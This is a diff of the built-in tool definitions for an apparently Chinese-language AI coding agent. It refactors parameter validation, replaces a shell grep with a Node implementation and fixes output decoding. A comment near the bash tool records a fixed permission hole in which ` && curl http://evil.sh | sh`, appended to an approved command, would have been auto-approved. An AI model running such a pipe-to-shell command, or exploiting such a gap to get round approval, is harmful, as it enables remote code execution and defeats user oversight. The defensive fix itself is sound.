@@ -13,57 +13,103 @@
  *    静默改错地方比拒绝一次的代价大得多（edit 的 0 命中与多命中两条拒绝路径即此原则）
  */
 import type { ToolProvider } from '../core/tools.js';
+import { defineTool, str, strAllowEmpty, optStr, optPosInt, optBool, ToolInputError } from './spec.js';
 
 /* ═══════════════════════════════════════════════════════════════════════════════
-   参数提取与校验
-   统一处理：取规范参数名 → 类型转换 → 范围校验
+   参数规则在每个工具的 spec 里，Schema 与校验都由它派生（实现见 spec.ts）
+
+   改前这里有 4 个校验件（requireString / requireStringAllowEmpty / optionalString /
+   optionalPositiveInt）、共 14 处调用，与下面 6 份 parameters 是**同一套规则的两份手写副本**，
+   纽带只有"人手把同一个词打了多遍"（grep 的 pattern 在一个工具里出现 7 次）。现在：
+     · 字段名只在 spec 里写一遍，Schema 的 properties / required 由 toJsonSchema 派生
+     · 校验由 registry.execute 在 handler **之前**跑 parseSpec，handler 里不再逐个取参
+     · handler 的入参类型由 Infer<typeof spec> 推出，args.pattern 直接就是 string
+
+   两个刻意保留的形状（不是遗漏）：
+   1. permissionKey / permissionDetail 仍拿**未经校验的原始 args**——权限确认发生在
+      agent-loop 调 execute 之前，那时还没跑 parse。所以 edit 的 permissionDetail 里那句
+      String(args.replaceAll) 消不掉（verify-spec 5-5 因此期望 1 而不是 0）。
+   2. 6 个 handler 的 catch 仍保留 instanceof ToolInputError 分支。parse 已经移到 execute
+      里、跑在 handler 之前，正常不会命中；留着是为了保住"handler 体内自己抛出的参数错误
+      也算 [INVALID]"这条分类不变量（代价：6 行实际不走的分支，以及为它保留的 import）。
    ═══════════════════════════════════════════════════════════════════════════════ */
 
-class ToolInputError extends Error {
-  code: string;
-  constructor(code: string, message: string) {
-    super(message);
-    this.code = code;
-    this.name = 'ToolInputError';
+/* ═══════════════════════════════════════════════════════════════════════════════
+   子进程输出解码 与 glob 编译
+   ═══════════════════════════════════════════════════════════════════════════════ */
+
+/**
+ * 把子进程的输出字节解成字符串。
+ *
+ * 为什么不能硬编码一种编码（改前硬编码 GBK，实测两处失真）：进程之间传的是**字节**，
+ * 字节不带"我是谁的编码"这个属性，而**谁产生的输出决定编码**——
+ *   · cmd.exe 内建命令（echo / dir / type / chcp）走控制台代码页，中文 Windows = 936(GBK)
+ *     实测 `echo 中文测试` → d6d0cec4b2e2cad4
+ *   · 外部程序（node / npm / git / tsc）走自己的编码，通常 UTF-8
+ *     实测 `node -e "console.log('中文测试')"` → e4b8ade69687e6b58be8af95
+ * 硬编码 GBK 时后者全变乱码：模型跑 `node -e "console.log('编译通过')"` 看到的是
+ * "缂栬瘧閫氳繃"，而它正是靠这段文本判断编译结果的。
+ *
+ * 策略：先按 UTF-8 **严格**解（fatal: true）——解得通就是 UTF-8（纯 ASCII 是两者的公共
+ * 子集，怎么解都一样）；解不通说明含非 UTF-8 字节，退回平台代码页。GBK 的中文字节序列
+ * （如 d6d0）在 UTF-8 下必然非法（双字节前导后必须跟 10xxxxxx，而 d0 不是），所以这个
+ * 探测在实践中是可靠的判别，不是碰运气。
+ *
+ * 残留限制（不装糊涂，写明）：一条命令同时混两种编码时（如 `echo x && node y`），GBK
+ * 字节会让 UTF-8 严格解失败，于是整段按 GBK 解，node 那部分仍乱码。逐段判编码要先按行
+ * 切字节再分别试解，代价是可能把一行 UTF-8 中文误判成 GBK（GBK 字符集覆盖面大，几乎所有
+ * 双字节组合都"合法"）。当前策略在"单一来源输出"（绝大多数情况）上是对的。
+ */
+function decodeChildOutput(raw: Buffer): string {
+  try {
+    return new TextDecoder('utf-8', { fatal: true }).decode(raw);
+  } catch {
+    // 回退解码器本身也可能不可用（Node 未带 full-icu 时 'gbk' 构造抛 RangeError）。
+    // 这种情况绝不能让它冒到 handler 的 catch 里——那会被报成 [ERROR] 命令执行失败，
+    // 模型会去排查一个根本没坏的执行环境（改前正是这条路）。
+    try {
+      return new TextDecoder(process.platform === 'win32' ? 'gbk' : 'utf-8', { fatal: false }).decode(raw);
+    } catch {
+      return raw.toString('utf-8');
+    }
   }
 }
 
-/** 提取字符串参数，校验非空 */
-function requireString(args: Record<string, unknown>, key: string, label: string): string {
-  const val = args[key];
-  if (val === undefined || val === null) throw new ToolInputError('missing', `${label} (${key}) 是必填参数`);
-  const str = String(val);
-  if (!str.trim()) throw new ToolInputError('empty', `${label} (${key}) 不能为空`);
-  return str;
-}
-
-/** 提取可选字符串，无值时返回默认值 */
-function optionalString(args: Record<string, unknown>, key: string, defaultVal: string): string {
-  const val = args[key];
-  if (val === undefined || val === null) return defaultVal;
-  return String(val);
-}
-
-/** 提取可选正整数 */
-function optionalPositiveInt(args: Record<string, unknown>, key: string, label: string, defaultVal: number): number {
-  const val = args[key];
-  if (val === undefined || val === null) return defaultVal;
-  const num = Number(val);
-  if (!Number.isInteger(num) || num < 1) throw new ToolInputError('invalid_range', `${label} (${key}) 必须是正整数`);
-  return num;
+/** 展开 glob 里的 {a,b}，支持多组嵌套（递归） */
+function expandBraces(glob: string): string[] {
+  const m = glob.match(/\{([^{}]*)\}/);
+  if (!m || m.index === undefined) return [glob];
+  const out: string[] = [];
+  for (const part of m[1].split(',')) {
+    out.push(...expandBraces(glob.slice(0, m.index) + part.trim() + glob.slice(m.index + m[0].length)));
+  }
+  return out;
 }
 
 /**
- * 提取必填字符串，但**允许空串**（与 requireString 的唯一差别：不校验非空）。
- * 用于 edit 的 newText：空串表示"删掉这一段"，是合法意图，不能当缺参拒绝。
- * 键不存在仍按缺参报错，避免模型漏传时静默把内容删光。
+ * 把 include 的 glob 编译成正则。只支持 * ? {} 三种——够用，且不至于自己写出半个 shell。
+ * 编译失败返回 null，由调用方报 [INVALID]：**不能静默当成"不过滤"**，那会把
+ * "只搜 .ts"变成"搜全部"，返回一堆无关命中而模型看不出过滤没生效。
  */
-function requireStringAllowEmpty(args: Record<string, unknown>, key: string, label: string): string {
-  const val = args[key];
-  if (val === undefined || val === null) {
-    throw new ToolInputError('missing', `${label} (${key}) 是必填参数（删除内容请显式传空字符串）`);
+function globToRegExp(glob: string): RegExp | null {
+  const parts = expandBraces(glob);
+  // 未闭合的 { （如 "*.{ts,"）在 JS 正则里会被当成字面量静默通过（Annex B 宽容），
+  // 编译不报错却匹配不到任何文件。这种"过滤掉一切"比"不过滤"更难发现：
+  // 模型只看到 [NO_MATCH] 无匹配，不会意识到是自己的 include 写错了。所以显式判掉
+  if (parts.some((p) => /[{}]/.test(p))) return null;
+  try {
+    const body = parts
+      // 顺序承重：先转义正则元字符，再把 * ? 换成字符类。
+      // 反过来做的话，[^/] 里的 ^ [ ] 会被自己的转义步骤再转一遍
+      .map((g) => g
+        .replace(/[.+^$()|[\]\\]/g, '\\$&')
+        .replace(/\*/g, '[^/]*')
+        .replace(/\?/g, '[^/]'))
+      .join('|');
+    return new RegExp(`^(?:${body})$`);
+  } catch {
+    return null;
   }
-  return String(val);
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════════
@@ -72,26 +118,16 @@ function requireStringAllowEmpty(args: Record<string, unknown>, key: string, lab
 
 export function registerBuiltinTools(tools: ToolProvider): void {
   /* ── Ls：列目录（了解结构，工具增强推理的起点） ── */
-  tools.register({
+  tools.register(defineTool({
     name: 'ls',
     description: '列出目录内容，了解项目/目录结构（动手前先看清结构）。目录项以 / 结尾。默认只列当前层，depth 可递归。跳过 .git/node_modules/dist 等噪音目录。',
-    parameters: {
-      type: 'object',
-      properties: {
-        path: {
-          type: 'string',
-          description: '目录路径，默认当前目录。示例: "src/" 或 "C:/Users/name/project"',
-        },
-        depth: {
-          type: 'number',
-          description: '递归深度（1=仅当前层）。默认 1。示例: 2 列出两层',
-        },
-      },
+    spec: {
+      path: optStr('目录路径', '目录路径，默认当前目录。示例: "src/" 或 "C:/Users/name/project"', '.'),
+      depth: optPosInt('递归深度', '递归深度（1=仅当前层）。默认 1。示例: 2 列出两层', 1),
     },
     handler: async (args) => {
       try {
-        const path = optionalString(args, 'path', '.');
-        const depth = optionalPositiveInt(args, 'depth', '递归深度', 1);
+        const { path, depth } = args;
 
         const { existsSync, statSync, readdirSync } = await import('node:fs');
         const resolvedPath = path.replace(/\\/g, '/');
@@ -140,35 +176,20 @@ export function registerBuiltinTools(tools: ToolProvider): void {
         return `[ERROR] 列目录失败: ${e instanceof Error ? e.message : String(e)}`;
       }
     },
-  });
+  }));
 
   /* ── Read：读文件 ── */
-  tools.register({
+  tools.register(defineTool({
     name: 'read',
     description: '读取文件内容。可指定行范围分段读取大文件。路径用 / 或 \\\\，如 "C:/Users/name/file.txt" 或 "src/utils/helper.ts"。',
-    parameters: {
-      type: 'object',
-      properties: {
-        path: {
-          type: 'string',
-          description: '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/file.txt" 或 "src/data/config.json"',
-        },
-        offset: {
-          type: 'number',
-          description: '起始行号，从 1 开始。默认 1。示例: 10 （从第 10 行开始读）',
-        },
-        limit: {
-          type: 'number',
-          description: '读取行数。默认不限制。示例: 50 （最多读 50 行）',
-        },
-      },
-      required: ['path'],
+    spec: {
+      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/file.txt" 或 "src/data/config.json"'),
+      offset: optPosInt('起始行号', '起始行号，从 1 开始。默认 1。示例: 10 （从第 10 行开始读）', 1),
+      limit: optPosInt('读取行数', '读取行数。默认不限制。示例: 50 （最多读 50 行）', Number.MAX_SAFE_INTEGER),
     },
     handler: async (args) => {
       try {
-        const path = requireString(args, 'path', '文件路径');
-        const offset = optionalPositiveInt(args, 'offset', '起始行号', 1);
-        const limit = optionalPositiveInt(args, 'limit', '读取行数', Number.MAX_SAFE_INTEGER);
+        const { path, offset, limit } = args;
 
         const { readFileSync, existsSync, statSync } = await import('node:fs');
         const resolvedPath = path.replace(/\\/g, '/');
@@ -193,34 +214,23 @@ export function registerBuiltinTools(tools: ToolProvider): void {
         return `[ERROR] 读取失败: ${e instanceof Error ? e.message : String(e)}`;
       }
     },
-  });
+  }));
 
   /* ── Write：写文件 ── */
-  tools.register({
+  tools.register(defineTool({
     name: 'write',
     description: '创建新文件或整篇覆盖已有文件的内容。自动创建不存在的父目录。只改文件里的一小段请用 edit（不必重抄全文，也不会误伤未改动的部分）。路径用 / 或 \\\\。',
     requirePermission: true,
-    parameters: {
-      type: 'object',
-      properties: {
-        path: {
-          type: 'string',
-          description: '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/output.txt" 或 "src/data/config.json"',
-        },
-        content: {
-          type: 'string',
-          description: '要写入的文件完整内容。会完全覆盖已存在的文件。示例: "{\\n  \\"name\\": \\"test\\"\\n}"',
-        },
-      },
-      required: ['path', 'content'],
+    spec: {
+      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/output.txt" 或 "src/data/config.json"'),
+      content: str('文件内容', '要写入的文件完整内容。会完全覆盖已存在的文件。示例: "{\\n  \\"name\\": \\"test\\"\\n}"'),
     },
     // 授权边界 = 目标文件。刻意不含 content：内容每次都不同，塞进键里会让"本次全部允许"
     // 退化成"只允许这一次"。反斜杠归一，免得 `src\x.ts` 与 `src/x.ts` 算成两个键。
     permissionKey: (args) => String(args.path ?? '').replace(/\\/g, '/'),
     handler: async (args) => {
       try {
-        const path = requireString(args, 'path', '文件路径');
-        const content = requireString(args, 'content', '文件内容');
+        const { path, content } = args;
 
         const { writeFileSync, readFileSync, mkdirSync, existsSync } = await import('node:fs');
         const { dirname } = await import('node:path');
@@ -246,34 +256,18 @@ export function registerBuiltinTools(tools: ToolProvider): void {
         return `[ERROR] 写入失败: ${e instanceof Error ? e.message : String(e)}`;
       }
     },
-  });
+  }));
 
   /* ── Edit：精准替换文件片段（改局部用它，不要 write 重抄全文） ── */
-  tools.register({
+  tools.register(defineTool({
     name: 'edit',
     description: '精准替换文件中的一段文本，用于局部修改（改一行、改一个函数、改一处配置）。oldText 必须与文件里的原文逐字符一致（缩进、空格、标点全算）且在文件中唯一；找不到或命中多处时本工具会拒绝并回报原因，文件一字不动。新建文件或整篇重写才用 write。路径用 / 或 \\\\。',
     requirePermission: true,
-    parameters: {
-      type: 'object',
-      properties: {
-        path: {
-          type: 'string',
-          description: '文件路径，绝对路径或相对当前工作目录。示例: "src/tools/builtin.ts"',
-        },
-        oldText: {
-          type: 'string',
-          description: '要被替换的原文片段，逐字符照抄文件里的内容（缩进与空格全算）。不确定就先用 read 看清原文，不要凭记忆填。片段要带足够上下文以保证在文件中唯一。示例: "const count = 1;"',
-        },
-        newText: {
-          type: 'string',
-          description: '替换后的新文本。传空字符串表示删掉 oldText 这一段。示例: "const count = 2;"',
-        },
-        replaceAll: {
-          type: 'boolean',
-          description: '命中多处时是否全部替换。默认 false，即多命中直接拒绝并回报候选行号。仅在确认每一处都该改成同样内容时才传 true。示例: false',
-        },
-      },
-      required: ['path', 'oldText', 'newText'],
+    spec: {
+      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "src/tools/builtin.ts"'),
+      oldText: str('原文片段', '要被替换的原文片段，逐字符照抄文件里的内容（缩进与空格全算）。不确定就先用 read 看清原文，不要凭记忆填。片段要带足够上下文以保证在文件中唯一。示例: "const count = 1;"'),
+      newText: strAllowEmpty('新文本', '替换后的新文本。传空字符串表示删掉 oldText 这一段。示例: "const count = 2;"', '（删除内容请显式传空字符串）'),
+      replaceAll: optBool('是否全部替换', '命中多处时是否全部替换。默认 false，即多命中直接拒绝并回报候选行号。仅在确认每一处都该改成同样内容时才传 true。示例: false', false),
     },
     // 授权边界 = 目标文件。刻意不含 oldText/newText：两段文本每次都不同，塞进键里会让
     // "本次全部允许"退化成"只允许这一次"；而只截前 N 字符更糟——那正是本轮修掉的静默扩权
@@ -292,10 +286,7 @@ export function registerBuiltinTools(tools: ToolProvider): void {
     },
     handler: async (args) => {
       try {
-        const path = requireString(args, 'path', '文件路径');
-        const oldText = requireString(args, 'oldText', '原文片段');
-        const newText = requireStringAllowEmpty(args, 'newText', '新文本');
-        const replaceAll = String(args.replaceAll) === 'true';
+        const { path, oldText, newText, replaceAll } = args;
         const resolvedPath = path.replace(/\\/g, '/');
 
         // 新旧文本相同：不落盘、不报成功，直接回一句无效（省掉无谓的写与验证）
@@ -338,10 +329,12 @@ export function registerBuiltinTools(tools: ToolProvider): void {
           hits.push(i);
         }
 
-        // 状态前缀的选择是**承重的**，不要"为一致性"改成 [NO_MATCH] / [INVALID]：
-        // agent-loop 只把 [ERROR] / [VERIFY_FAILED] 记作失败，而"重复失败保护"只在失败时计数，
+        // 状态前缀的选择是**承重的**，不要"为一致性"改成 [NO_MATCH] / [NOT_FOUND]：
+        // agent-loop 把 [ERROR] / [VERIFY_FAILED] / [INVALID] 记作失败，而"重复失败保护"只在失败时计数，
         // 第 2 次同样调用就会追加 [系统提示] 叫模型停止原样重试、先去 read 确认。
-        // 定位失败（0 命中 / 多命中）恰恰是最容易被原样重试的一类，用软前缀等于把这层保护关掉。
+        // 定位失败（0 命中 / 多命中）恰恰是最容易被原样重试的一类，用有效否定前缀等于把这层保护关掉。
+        // 为何不用 [INVALID]（2026-09-05 起它也计失败，行为上已等价）：0 命中不是"参数格式不合法"，
+        // 而是"文件内容与模型预期不符"——参数本身完全合法，语义上属执行失败。
         // 反之 [NOT_FOUND]（目标文件不存在）保持与 read/write 一致的有效否定语义。
         if (hits.length === 0) {
           return `[ERROR] oldText 在文件中找不到，未做任何改动: ${resolvedPath}\n`
@@ -383,75 +376,132 @@ export function registerBuiltinTools(tools: ToolProvider): void {
         return `[ERROR] 替换失败: ${e instanceof Error ? e.message : String(e)}`;
       }
     },
-  });
+  }));
 
   /* ── Grep：搜索文件内容 ── */
-  tools.register({
+  tools.register(defineTool({
     name: 'grep',
-    description: '在文件中搜索文本或正则模式，返回匹配行及行号。基于 ripgrep (rg) 或系统 grep。',
-    parameters: {
-      type: 'object',
-      properties: {
-        pattern: {
-          type: 'string',
-          description: '搜索模式，支持正则表达式。特殊字符请转义。示例: "function\\s+\\w+" 或 "TODO|FIXME" 或 "console\\.log"',
-        },
-        path: {
-          type: 'string',
-          description: '搜索路径，文件或目录。默认当前目录。示例: "src/" 或 "C:/Users/name/project"',
-        },
-        include: {
-          type: 'string',
-          description: '文件类型过滤 glob 模式。示例: "*.ts" 或 "*.{ts,js,json}" 或 "*.txt"',
-        },
-      },
-      required: ['pattern'],
+    description: '在文件中递归搜索文本或正则模式，返回"路径:行号:该行内容"。纯 Node 实现、跨平台（Windows 无需装 grep 或 rg）。跳过 .git/node_modules/dist、二进制文件与超大文件。pattern 按 JS 正则编译。',
+    spec: {
+      pattern: str('搜索模式', '搜索模式，支持正则表达式。特殊字符请转义。示例: "function\\s+\\w+" 或 "TODO|FIXME" 或 "console\\.log"'),
+      path: optStr('搜索路径', '搜索路径，文件或目录。默认当前目录。示例: "src/" 或 "C:/Users/name/project"', '.'),
+      include: optStr('过滤模式', '文件类型过滤 glob 模式。示例: "*.ts" 或 "*.{ts,js,json}" 或 "*.txt"', ''),
     },
     handler: async (args) => {
       try {
-        const pattern = requireString(args, 'pattern', '搜索模式');
-        const searchPath = optionalString(args, 'path', '.');
-        const glob = optionalString(args, 'include', '');
+        // path / include 改名解构：handler 体内沿用的局部名是 searchPath / glob
+        //（path 与下面的 resolvedPath、glob 与 globToRegExp 各自成对，改名反而读着费劲）
+        const { pattern, path: searchPath, include: glob } = args;
 
-        const { execSync } = await import('node:child_process');
-        const resolvedPath = searchPath.replace(/\\/g, '/');
-        const globFlag = glob ? `--glob "${glob}"` : '';
-        const cmd = `grep -rn --binary-files=without-match ${globFlag} "${pattern}" "${resolvedPath}" 2>/dev/null | head -50`;
+        /* 纯 Node 遍历，不再 shell 出去。改前拼的是 `grep -rn ... 2>/dev/null | head -50`：
+           POSIX 语法，而 Windows 上 execSync 走 cmd.exe —— grep 不存在、2>/dev/null 被当成
+           路径，实测在中文 Windows 上任何调用都失败；更糟的是失败被报成 [NO_MATCH]，而
+           agent-loop 把 NO_MATCH 归为"有效否定（不计失败）"，于是模型搜一个**确实存在**的
+           符号会得到"无匹配"，据此形成对整个代码库的错误认知，且收不到任何警告。 */
 
-        const output = execSync(cmd, { encoding: 'utf-8', timeout: 10000 });
-
-        if (!output.trim()) {
-          return `[NO_MATCH] 无匹配结果: "${pattern}" 在 ${resolvedPath}${glob ? ` (${glob})` : ''}`;
+        // 坏正则必须是 [INVALID]，不能混进 [NO_MATCH]：那是"我写错了"与"项目里没有"的区别
+        let re: RegExp;
+        try {
+          re = new RegExp(pattern);
+        } catch (e) {
+          return `[INVALID] 正则无法编译: /${pattern}/ —— ${e instanceof Error ? e.message : String(e)}`;
         }
+        const includeRe = glob ? globToRegExp(glob) : null;
+        if (glob && includeRe === null) return `[INVALID] include 过滤模式无法编译: ${glob}`;
 
-        const matches = output.trim().slice(0, 4000);
-        const lineCount = matches.split('\n').length;
-        return `[OK] 找到 ${lineCount} 个匹配 (截断至 4000 字符):\n${matches}`;
+        const { existsSync, statSync, readdirSync, readFileSync } = await import('node:fs');
+        const resolvedPath = searchPath.replace(/\\/g, '/');
+        if (!existsSync(resolvedPath)) return `[NOT_FOUND] 路径不存在: ${resolvedPath}`;
+
+        const SKIP_DIRS = new Set(['.git', 'node_modules', 'dist']);
+        const MAX_FILE_BYTES = 2 * 1024 * 1024;   // 超大文件跳过：读进来只为搜一遍不值得
+        const MAX_MATCHES = 50;                   // 与改前的 head -50 同量级，防输出膨胀
+        const MAX_FILES = 5000;                   // 防误指向盘符根目录时走到天荒地老
+        const PROBE_BYTES = 8192;                 // 二进制判定的探测窗口
+
+        const hits: string[] = [];
+        let scanned = 0, skippedBinary = 0, skippedBig = 0, hitCap = false;
+
+        const scanFile = (file: string): void => {
+          if (hitCap || scanned >= MAX_FILES) return;
+          let buf: Buffer;
+          try {
+            buf = readFileSync(file);
+          } catch {
+            return;   // 无权限 / 占用中 → 跳过该文件，不该让整个搜索失败
+          }
+          if (buf.length > MAX_FILE_BYTES) { skippedBig++; return; }
+          // 二进制判定：头部窗口内有 NUL 字节即视为二进制（与 ripgrep 同一思路）。
+          // 不跳过的话，一个 .png 能贡献几百行乱码命中，把 50 个名额全吃光。
+          // 注意 Buffer.indexOf 的第三参是 encoding 而非结束位置，限定窗口只能先 subarray
+          //（subarray 越界会自动夹到长度，不必自己 Math.min）
+          if (buf.subarray(0, PROBE_BYTES).indexOf(0) !== -1) { skippedBinary++; return; }
+          scanned++;
+          const lines = buf.toString('utf-8').split('\n');
+          for (let i = 0; i < lines.length; i++) {
+            const line = lines[i].endsWith('\r') ? lines[i].slice(0, -1) : lines[i];
+            if (!re.test(line)) continue;
+            hits.push(`${file}:${i + 1}:${line}`);
+            if (hits.length >= MAX_MATCHES) { hitCap = true; return; }
+          }
+        };
+
+        const walk = (dir: string): void => {
+          if (hitCap || scanned >= MAX_FILES) return;
+          let items;
+          try {
+            items = readdirSync(dir, { withFileTypes: true });
+          } catch {
+            return;
+          }
+          items.sort((a, b) => a.name.localeCompare(b.name));   // 排序让输出稳定，断言才可复现
+          for (const item of items) {
+            if (hitCap) return;
+            if (item.name.startsWith('.') || SKIP_DIRS.has(item.name)) continue;
+            const full = `${dir}/${item.name}`;
+            if (item.isDirectory()) { walk(full); continue; }
+            if (includeRe && !includeRe.test(item.name)) continue;
+            scanFile(full);
+          }
+        };
+
+        if (statSync(resolvedPath).isDirectory()) walk(resolvedPath);
+        else scanFile(resolvedPath);
+
+        // "扫了 N 个文件"必须回给模型：0 命中时它需要区分"扫了 300 个文件确实没有"
+        // 与"过滤器把所有文件都排除了"——后者是它自己 include 写错了
+        const stats = [
+          `已扫 ${scanned} 个文件`,
+          hitCap ? `命中达上限 ${MAX_MATCHES} 已停止` : '',
+          skippedBinary ? `跳过 ${skippedBinary} 个二进制` : '',
+          skippedBig ? `跳过 ${skippedBig} 个超大文件` : '',
+        ].filter(Boolean).join('，');
+
+        if (hits.length === 0) {
+          return `[NO_MATCH] 无匹配结果: /${pattern}/ 在 ${resolvedPath}${glob ? ` (${glob})` : ''} —— ${stats}`;
+        }
+        const body = hits.join('\n');
+        const shown = body.length > 4000
+          ? `${body.slice(0, 4000)}\n...（结果截断：共 ${body.length} 字符）`
+          : body;
+        return `[OK] 找到 ${hits.length} 处匹配（${stats}）:\n${shown}`;
       } catch (e) {
         if (e instanceof ToolInputError) return `[INVALID] ${e.message}`;
-        return `[NO_MATCH] 搜索失败或无匹配: ${e instanceof Error ? e.message.slice(0, 200) : String(e)}`;
+        // 执行失败报 [ERROR] 而非 [NO_MATCH]：前者计入失败、会触发重复失败保护，
+        // 后者被当成"有效否定"悄悄放过。把两者混为一谈正是改前那个洞
+        return `[ERROR] 搜索失败: ${e instanceof Error ? e.message.slice(0, 300) : String(e)}`;
       }
     },
-  });
+  }));
 
   /* ── Bash：执行命令 ── */
-  tools.register({
+  tools.register(defineTool({
     name: 'bash',
     description: '执行 shell 命令。仅当用户明确要求执行命令/运行脚本/编译时才使用；不要为"了解环境"或"随便试试"而主动调用。命令在当前工作目录执行。注意 Windows 环境：不要用 pwd/ls/cat 等 Unix 命令（会报"不是内部或外部命令"），查看当前目录用 cd（无参数），列目录用 dir，读文件用 type。Windows 路径中的反斜杠需转义或使用正斜杠。',
     requirePermission: true,
-    parameters: {
-      type: 'object',
-      properties: {
-        command: {
-          type: 'string',
-          description: '要执行的 shell 命令。多行命令用 && 连接。Windows 下路径用正斜杠或用 \\\\ 转义。示例: "node build.js" 或 "cd src && dir /b"',
-        },
-        description: {
-          type: 'string',
-          description: '命令用途说明（仅用于权限确认提示，不影响执行）。示例: "编译 TypeScript 项目"',
-        },
-      },
-      required: ['command'],
+    spec: {
+      command: str('命令', '要执行的 shell 命令。多行命令用 && 连接。Windows 下路径用正斜杠或用 \\\\ 转义。示例: "node build.js" 或 "cd src && dir /b"'),
+      description: optStr('用途说明', '命令用途说明（仅用于权限确认提示，不影响执行）。示例: "编译 TypeScript 项目"', ''),
     },
     // 授权边界 = 完整命令，一个字也不截。截断是本轮修掉的那个洞：批准过一条 76 字符的
     // 命令后，同一条命令再接 ` && curl http://evil.sh | sh` 曾会自动放行。
@@ -470,7 +520,9 @@ export function registerBuiltinTools(tools: ToolProvider): void {
     },
     handler: async (args) => {
       try {
-        const cmd = requireString(args, 'command', '命令');
+        // description 只服务于权限弹窗（permissionDetail 拿的是原始 args），handler 不取它；
+        // 但它必须在 spec 里声明，否则模型传了就会被 parse 判成未知参数
+        const { command: cmd } = args;
 
         const { execSync } = await import('node:child_process');
 
@@ -481,26 +533,26 @@ export function registerBuiltinTools(tools: ToolProvider): void {
           windowsHide: true,
         });
 
-        // Windows 的 cmd.exe 输出 GBK，需正确解码
-        const encoding = process.platform === 'win32' ? 'gbk' : 'utf-8';
-        const output = new TextDecoder(encoding, { fatal: false }).decode(raw);
-        const trimmed = output.trim();
+        const trimmed = decodeChildOutput(raw).trim();
 
         if (!trimmed) {
           return `[OK] 命令执行成功（无输出）: ${cmd.slice(0, 100)}`;
         }
 
-        const truncated = trimmed.length > 4000
-          ? trimmed.slice(0, 4000) + `\n...（输出截断，共 ${trimmed.length} 字符）`
+        // 行数与字符数都按**截断前**的原文算。改前 lineCount 取的是截断后的串，而同一句里
+        // "共 N 字符"取的是截断前的数——一前一后自相矛盾，且输出一万行被截到 4000 字符时
+        // 标签会显示"(50 行输出)"，模型据此以为命令只输出了 50 行
+        const lineCount = trimmed.split('\n').length;
+        const shown = trimmed.length > 4000
+          ? `${trimmed.slice(0, 4000)}\n...（输出截断：共 ${trimmed.length} 字符、${lineCount} 行，此处只显示前 4000 字符）`
           : trimmed;
-        const lineCount = truncated.split('\n').length;
 
-        return `[OK] 命令执行成功 (${lineCount} 行输出):\n${truncated}`;
+        return `[OK] 命令执行成功 (${lineCount} 行输出，${trimmed.length} 字符):\n${shown}`;
       } catch (e) {
         if (e instanceof ToolInputError) return `[INVALID] ${e.message}`;
         const msg = e instanceof Error ? e.message.slice(0, 500) : String(e);
         return `[ERROR] 命令执行失败: ${msg}`;
       }
     },
-  });
+  }));
 }
